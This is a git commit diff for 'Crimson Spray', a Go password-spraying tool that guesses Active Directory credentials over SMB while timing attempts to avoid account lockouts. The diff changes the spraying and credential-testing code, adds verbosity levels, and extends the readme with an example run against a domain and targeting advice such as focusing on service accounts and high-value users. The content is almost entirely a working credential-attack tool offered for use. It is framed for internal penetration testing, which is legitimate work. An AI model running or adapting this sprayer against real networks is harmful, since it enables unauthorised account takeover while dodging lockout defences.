8fb52079bbf3d272bff894e720a348b45a1688a4
iLightThings <gitgub@ggray.info>
2021-12-14 16:23:44 -0500

    Feature updates and bug fixes.
    Added Tiered Verbosity
    Added more notes to the stats function
    Added more better logging
    Fix an issue where --bypass-wait was not working (thanks @dievus for reporting)
    Fixed issue where the password file would be saved to memory for every different user instead of once.
    Fix an issue where program would crash when it ran out of passwords to guess.
    Updated Readme to include more details about the tool.

--- main.go
+++ main.go
@@ -14,75 +14,89 @@ import (
 )
 
 func main() {
-	parser := argparse.NewParser("Crimson Spary","A lockout aware password sprayer for Internal network security assessments.")
-	var userFilePathArg = parser.String("u","username-file",&argparse.Options{Required: true,Help: "(Required) File of users separated by newlines"})
-	var passFilePathArg = parser.String("p","password-file",&argparse.Options{Required: true,Help: "(Required) File of passwords seperated by newlines. A good wordlist generator can be found at https://weakpass.com/generate"})
-	var domainArg = parser.String("d","domain",&argparse.Options{Required: true,Help: "(Required) Domain of user "})
-	var targetArg = parser.String("t","target",&argparse.Options{Required: true,Help: "(Required) IP or Hostname of target to authenticate against"})
-	var lockThresh = parser.Int("a","Lockout-Threshold",&argparse.Options{Required: true,Help: "(Required) Number of passwords attempts before lockout. Attempts will not exceed this amount - 1."})
-	var lockThreshTime  = parser.Int("l","Lockout-Reset",&argparse.Options{Required: true,Help: "(Required) Duration of time in minutes for the threshold timer to elapse. An addition minute is added"})
-	var lockTime = parser.Int("r","Lockout-Timer",&argparse.Options{Required: true,Help: "(Required) Duration of time in minutes for an locked out account to become unlocked. If account lockout is detected, program will wait this time + 1 minute."})
-	var bypassWait = parser.Flag("","bypass-wait",&argparse.Options{Help: "Bypass initial lock threshold reset period"})
-	var noHeaderArg = parser.Flag("","no-stats",&argparse.Options{Default: false,Help: "Suppress stats banner"})
-	var verboseArg = parser.Flag("v","verbose",&argparse.Options{Default: false,Help: "Print Debug"})
+	parser := argparse.NewParser("crimson-spary", "A lockout aware password sprayer for Active Directory. Please enter the raw net accounts /domain variables for best results. It is also advisable to use this against service accounts.")
+	var userFilePathArg = parser.String("u", "username-file", &argparse.Options{Required: true, Help: "(Required) File of users separated by newlines"})
+	var passFilePathArg = parser.String("p", "password-file", &argparse.Options{Required: true, Help: "(Required) File of passwords seperated by newlines. A good wordlist generator can be found at https://weakpass.com/generate"})
+	var domainArg = parser.String("d", "domain", &argparse.Options{Required: true, Help: "(Required) Domain of user "})
+	var targetArg = parser.String("t", "target", &argparse.Options{Required: true, Help: "(Required) IP or Hostname of target to authenticate against"})
+	var lockThresh = parser.Int("a", "Lockout-Threshold", &argparse.Options{Required: true, Help: "(Required) Number of passwords attempts before lockout. Attempts will not exceed this amount - 1."})
+	var lockThreshTime = parser.Int("l", "Lockout-Reset", &argparse.Options{Required: true, Help: "(Required) Duration of time in minutes for the threshold timer to elapse. An addition minute is added"})
+	var lockTime = parser.Int("r", "Lockout-Timer", &argparse.Options{Required: true, Help: "(Required) Duration of time in minutes for an locked out account to become unlocked. If account lockout is detected, program will wait this time + 1 minute.\n"})
+	var bypassWait = parser.Flag("", "bypass-wait", &argparse.Options{Help: "Bypass initial lock threshold reset period"})
+	var noHeaderArg = parser.Flag("", "no-stats", &argparse.Options{Default: false, Help: "Suppress stats banner"})
+	var verboseArg = parser.Int("v", "verbose", &argparse.Options{Default: 2, Help: "0 - No output (will disable prerun stats) | 1 - Success Messages | 2 - Lockout , Pause , and Success Messages | 3 - Attempts, Pause, Lockout and Success Messages | 4 - Debug Messages"})
 
 	err := parser.Parse(os.Args)
+	log.SetOutput(os.Stdout)
 	if err != nil {
 		log.Println(parser.Usage(err))
 	} else {
-		if *noHeaderArg == false{
-			preRunChecks(*userFilePathArg,*passFilePathArg,*domainArg,*targetArg,*lockThresh,*lockThreshTime,*lockTime)
+		if *noHeaderArg == false && *verboseArg != 0 {
+			preRunStats(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime, *lockTime, *verboseArg)
 		}
-		if bypassWait != nil{
-			log.Printf("Waiting inital lockout reset threshold... %d mins (You can bypass this with -bypass-wait)",*lockThreshTime)
+		if *bypassWait != true {
+			log.Printf("Waiting inital lockout reset threshold... %d mins (You can bypass this with --bypass-wait)", *lockThreshTime)
 			time.Sleep(time.Duration(*lockThreshTime) * time.Minute)
 		}
 		log.Printf("Starting Spray..... ")
-		multiSpray(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime ,*lockTime,*verboseArg)
+		multiSpray(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime, *lockTime, *verboseArg)
 	}
 
-
 }
 
-func preRunChecks(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int){
+func preRunStats(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int, verbose int) {
 	userListLen := len(readFile(usernamePath))
 	passwordListLen := len(readFile(passwordPath))
-	numberOfRounds := passwordListLen / (lockoutThreshold-1)
-	estimatedMaxTime := numberOfRounds*(lockoutResetTimer+1)
+	numberOfRounds := passwordListLen / (lockoutThreshold - 1)
+	estimatedMaxTime := numberOfRounds * (lockoutResetTimer + 1)
+	if estimatedMaxTime == 0 {
+		estimatedMaxTime = lockoutThreshold
+	}
 	timeLongForm := time.Duration(estimatedMaxTime) * time.Minute
-	fmt.Println()
-	fmt.Printf("Imported Users: %d\n",userListLen)
-	fmt.Printf("Imported Passwords: %d\n",passwordListLen)
-	fmt.Println()
-	fmt.Printf("Target Domain: %s\n",domain)
-	fmt.Printf("Target Host: %s\n",targetIP)
-	fmt.Println()
-	fmt.Printf("Lockout Attempt Threshold: %d \n",lockoutThreshold)
-	fmt.Printf("Lockout Threshold Reset: %s \n",time.Duration(lockoutResetTimer) * time.Minute)
-	fmt.Printf("Lockout Timer: %s \n",time.Duration(lockoutTimer) * time.Minute)
-	fmt.Printf("Estimated Max Completion Time (if no lockout occurs): %s\n",timeLongForm)
-	fmt.Println()
-	/*
-	UserList will not matter if all accounts are tested at once.
-	Passwordlistlen / lockoutThreshold = roundsOfAttempts
-	LockoutResetTimer * roundOfAttempt = Estimated max time if no lockouts occure
-	 */
+	var verboseDetail string
+	switch verbose {
+	case 1:
+		verboseDetail = "1 - Success Messages Only"
+	case 2:
+		verboseDetail = "2 - Pauses, Lockout and Success Messages"
+	case 3:
+		verboseDetail = "3 - Attempts, Pause, Lockout and Success Messages"
+	case 4:
+		verboseDetail = "4 - Debug Messages"
 
+	}
+	fmt.Println()
+	fmt.Printf("Imported Users: %d\n", userListLen)
+	fmt.Printf("Imported Passwords: %d\n", passwordListLen)
+	fmt.Println()
+	fmt.Printf("Target Domain: %s\n", domain)
+	fmt.Printf("Target Host: %s\n", targetIP)
+	fmt.Println()
+	fmt.Printf("Lockout Attempt Threshold: %d \n", lockoutThreshold)
+	fmt.Printf("Lockout Threshold Reset: %s \n", time.Duration(lockoutResetTimer)*time.Minute)
+	fmt.Printf("Lockout Timer: %s \n", time.Duration(lockoutTimer)*time.Minute)
+	fmt.Printf("Estimated Max Completion Time (if no lockout occurs): %s\n", timeLongForm)
+	fmt.Println()
+	fmt.Printf("Verbose Level: %s\n\n", verboseDetail)
+	/*
+		UserList will not matter if all accounts are tested at once.
+		PasswordListLen / lockoutThreshold = roundsOfAttempts
+		LockoutResetTimer * roundOfAttempt = Estimated max time if no lockouts occur
+	*/
 }
 
-func singleUserSpray(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int64,verbose bool) {
+func singleUserSpray(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int64, verbose int) {
 	userList := readFile(usernamePath)
 	passwordList := readFile(passwordPath)
 	resetTimerDuration := lockoutResetTimer + 1
 	attemptThreshold := lockoutThreshold - 1
 	currentPasswordIndex := 0
 	for _, users := range userList {
-
 		for currentPasswordIndex < len(passwordList) {
 			result := 4
 			for i := 0; i < attemptThreshold; i++ {
 				passwordToAttempt := passwordList[currentPasswordIndex+i]
-				result = testCred(users, passwordToAttempt, domain, targetIP,verbose)
+				result = testCred(users, passwordToAttempt, domain, targetIP, verbose)
 				if result == 0 {
 					break
 				} else if result == 2 {
@@ -102,52 +116,58 @@ func singleUserSpray(usernamePath string, passwordPath string, domain string, ta
 
 }
 
-func multiSpray(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int,verbose bool){
+func multiSpray(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int, verbose int) {
 	userList := readFile(usernamePath)
+	passwordList := readFile(passwordPath)
 	var wg sync.WaitGroup
-	for x := range userList{
+	for x := range userList {
 		wg.Add(1)
-		useruser := userList[x]
+		userUser := userList[x]
 		//UserSpray(y, passwordPath, domain, targetIP, lockoutThreshold, lockoutResetTimer, lockoutTimer)
 		go func() {
 			defer wg.Done()
-			UserSpray(useruser, passwordPath, domain, targetIP, lockoutThreshold, lockoutResetTimer, lockoutTimer,verbose)
+			UserSpray(userUser, passwordList, domain, targetIP, lockoutThreshold, lockoutResetTimer, lockoutTimer, verbose)
 		}()
 	}
 	wg.Wait()
-
+	log.Println("Crimson Spray Completed")
 }
 
-func UserSpray(username string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int, verbose bool) string {
-
-	passwordList := readFile(passwordPath)
+func UserSpray(username string, passwordSlice []string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int, verbose int) string {
 	resetTimerDuration := lockoutResetTimer + 1
 	attemptThreshold := lockoutThreshold - 2
 	currentPasswordIndex := 0
-	for currentPasswordIndex < len(passwordList)+1 {
+	passwordListLen := len(passwordSlice) - 1
+	for currentPasswordIndex < passwordListLen {
 		result := 4 //
-		for i := 0; i < attemptThreshold; i++ {
-			passwordToAttempt := passwordList[currentPasswordIndex]
-			result = testCred(username, passwordToAttempt, domain, targetIP,verbose)
+		for i := 0; i <= attemptThreshold; i++ {
+			passwordToAttempt := passwordSlice[currentPasswordIndex]
+			result = testCred(username, passwordToAttempt, domain, targetIP, verbose)
 			if result == 0 {
 				break
 			} else if result == 2 {
-				log.Printf("User account %s is locked out. Lockout out ends in %d mintues\n", username, lockoutTimer+1)
+				if verbose >= 2 {
+					log.Printf("User account %s is locked out. Lockout out ends in %d mintues\n", username, lockoutTimer+1)
+				}
 				time.Sleep(time.Duration(lockoutTimer+1) * time.Minute)
 			}
 			currentPasswordIndex++
+			if currentPasswordIndex == passwordListLen {
+				break
+			}
 		}
 		if result == 0 {
 			break
 		}
-		log.Printf("Threshold for %s resets in %d mins\n", username,resetTimerDuration)
+		if verbose >= 2 {
+			log.Printf("Threshold for %s resets in %d mins\n", username, resetTimerDuration)
+		}
 		time.Sleep(time.Duration(resetTimerDuration) * time.Minute)
-
 	}
-	return fmt.Sprintf("Done user %s",username)
+	return fmt.Sprintf("Done user %s", username)
 }
 
-func testCred(name string, passwordGuess string, domainDst string, ip string,verbose bool) int {
+func testCred(name string, passwordGuess string, domainDst string, ip string, verbose int) int {
 	/* Return Values
 	0 - Log in successful
 	1 - Log in failed
@@ -156,16 +176,16 @@ func testCred(name string, passwordGuess string, domainDst string, ip string,ver
 	4 - Default first loop. This should never be returned
 	*/
 	dstServer := fmt.Sprintf("%s:445", ip)
-	if verbose{
-		log.Printf("Attempting to connect to %s",dstServer)
+	if verbose >= 4 {
+		log.Printf("Attempting to connect to %s", dstServer)
 	}
 	conn, err := net.Dial("tcp", dstServer)
 	if err != nil {
 		panic(err)
 	}
 	defer conn.Close()
-	if verbose {
-		log.Printf("Connected to %s",dstServer)
+	if verbose >= 4 {
+		log.Printf("Connected to %s", dstServer)
 		log.Printf("Attempting %s\\%s:%s @ %s --- ", domainDst, name, passwordGuess, dstServer)
 	}
 	d := &smb2.Dialer{
@@ -177,20 +197,23 @@ func testCred(name string, passwordGuess string, domainDst string, ip string,ver
 	}
 	_, err = d.Dial(conn)
 	if err != nil {
-		if verbose{
+		if verbose >= 4 {
 			log.Print(err.Error())
 		}
 		if strings.Contains(err.Error(), "automatically locked because too many invalid logon attempts") {
 			return 2
 		} else {
-			log.Printf("Failed %s:%s\n",name,passwordGuess)
+			if verbose >= 3 {
+				log.Printf("Failed %s\\%s:%s\n", domainDst, name, passwordGuess)
+			}
 			return 1
 		}
 	} else {
-		log.Printf("Found %s:%s\n",name,passwordGuess)
+		if verbose >= 1 {
+			log.Printf("!!!Found Creds (  %s\\%s:%s  )!!!\n", domainDst, name, passwordGuess)
+		}
 		return 0
 	}
-
 }
 
 func sannityCheckIP(ip string) bool {
@@ -205,11 +228,11 @@ func sannityCheckIP(ip string) bool {
 }
 
 func readFile(filepath string) []string {
-	filebytes, err := os.Open(filepath)
+	fileBytes, err := os.Open(filepath)
 	if err != nil {
 		log.Fatalf("Failed to open %s", filepath)
 	}
-	scanner := bufio.NewScanner(filebytes)
+	scanner := bufio.NewScanner(fileBytes)
 	scanner.Split(bufio.ScanLines)
 	var entries []string
 	for scanner.Scan() {
@@ -218,28 +241,11 @@ func readFile(filepath string) []string {
 	return entries
 }
 
-
-/* Modes:
-1: Rush - Attempts burst in short amount of time for all users upto lockout threshold - more likely to be detected
-2: Distributed - Attempts distributed along a timeline
-3: Single user mode - Will do attempts for single users at a time.
-
-Options:
-Safe start - Will wait the lockout reset time before it begins first round of testing
-caution - Will check for lockout status before each attempt
-
-
+/*
+Verbose levels:
+0 - No output
+1 - Success Only
+2 - Lockout Time, Pause Time, Success
+3 - All attempts and Timers and Success
+4 - Debug
 */
-
-
-func contains(s []string, str string) bool {
-	for _, v := range s {
-		if v == str {
-			return true
-		}
-	}
-
-	return false
-}
-
-
--- readme.md
+++ readme.md
@@ -2,41 +2,60 @@ Placeholder text.
 
 Use -h for usage.
 
-`go run main.go -u ".\testcase\users.txt" -p ".\testcase\passwords.txt" -d "attack.local" -t "10.255.0.2" -a 10 -l 5 -r 5`
 
+`go run main.go -u ".\testcase\users.txt" -p ".\testcase\passwords.txt" -d "attack.local" -t "10.255.0.2" -a 10 -l 5 -r 15` 
 
+This command will run 9 password attempts then wait 6 minutes before trying another 9 attempts. If the account is detected to be locked out, it will wait 16 minutes before trying more passwords. 
 ```
-usage: Crimson Spary [-h|--help] -u|--username-file "<value>"
+usage: crimson-spary [-h|--help] -u|--username-file "<value>"
                      -p|--password-file "<value>" -d|--domain "<value>"
                      -t|--target "<value>" -a|--Lockout-Threshold <integer>
                      -l|--Lockout-Reset <integer> -r|--Lockout-Timer <integer>
-                     [--bypass-wait] [--no-stats] [-v|--verbose]
+                     [--bypass-wait] [--no-stats] [-v|--verbose <integer>]
 
-                     A lockout aware password sprayer for Internal network
-                     security assessments.
+                     A lockout aware password sprayer for Active Directory.
+                     Please enter the raw net accounts /domain variables for
+                     best results. It is also advisable to use this against
+                     service accounts.
 
 Arguments:
 
   -h  --help               Print help information
-  -u  --username-file      File of users separated by newlines
-  -p  --password-file      File of passwords seperated by newlines. A good
-                           wordlist generator can be found at
+  -u  --username-file      (Required) File of users separated by newlines
+  -p  --password-file      (Required) File of passwords seperated by newlines.
+                           A good wordlist generator can be found at
                            https://weakpass.com/generate
-  -d  --domain
-  -t  --target             IP or Hostname of target to authenticate against.
-  -a  --Lockout-Threshold  Number of passwords attempts before lockout.
-                           Attempts will not exceed this amount - 1.
-  -l  --Lockout-Reset      Duration of time in minutes for the threshold timer
-                           to elapse. An addition minute is added.
-  -r  --Lockout-Timer      Duration of time in minutes for an locked out
-                           account to become unlocked. If account lockout is
-                           detected, program will wait this time + 1 minute.
+  -d  --domain             (Required) Domain of user
+  -t  --target             (Required) IP or Hostname of target to authenticate
+                           against
+  -a  --Lockout-Threshold  (Required) Number of passwords attempts before
+                           lockout. Attempts will not exceed this amount - 1.
+  -l  --Lockout-Reset      (Required) Duration of time in minutes for the
+                           threshold timer to elapse. An addition minute is
+                           added
+  -r  --Lockout-Timer      (Required) Duration of time in minutes for an locked
+                           out account to become unlocked. If account lockout
+                           is detected, program will wait this time + 1
+                           minute.
+
       --bypass-wait        Bypass initial lock threshold reset period
       --no-stats           Suppress stats banner. Default: false
-  -v  --verbose            Print Debug. Default: false
-
+  -v  --verbose            0 - No output (will disable prerun stats) | 1 -
+                           Success Messages | 2 - Lockout , Pause , and Success
+                           Messages | 3 - Attempts, Pause, Lockout and Success
+                           Messages | 4 - Debug Messages. Default: 2
 ```
 
+Crimson spray will wait the inital lockout threshold time before starting to avoid any conflicts with current password attempts. You can avoid this by using the flag --bypass-wait.
+
+
+---
+# Considerations before running
+- Although the command `net accounts /domain` will show you the lockout policy in the current context, the Domain may have seperate policys for different user groups and you may end up locking out accounts. Default verbosity is set to show when lockouts occur.
+- Ensure there is no duplicates in the usernames list. This will cause a lockout as they are run twice.
+- **Don't** run `rockyou.txt` or any other giant wordlist. It will just increase the time considerably. This is a tool for weak password that could be easily guesses. Check out https://weakpass.com/generate for good password generation.
+- At the moment, this tool does not limit how many users at once it can do. Try to limit your users list to only service accounts, high value targets, or hand picked users.
+- Consider the password policy and don't include passwords that don't meet the required length or complexity. This might be set independantly for certain groups.
 
 
 
@@ -44,10 +63,17 @@ Todo:
 - [ ] Add a pause and resume feature. 
 - [ ] Add a lockout check before ever attempt (Will need working creds)
 - [ ] Add LDAP as a protocol method
-- [ ] Add estimated timer completion
+- [x] Add estimated timer completion
 - [ ] Add Jitter option
 - [x] Add a default flag to wait lockout threshold before beginning
 - [ ] Add different attack modes
 - [ ] Add an option for max concurrent users
 - [x] Add a pre-Spray Stats display
+- [ ] Add found_users.txt file for output
+- [x] Verbose Levels
+- [ ] Add a message for account password expiry
+- [ ] Check for duplicates in passwordlist and username list
+- [ ] Add Output to file
+
+
 
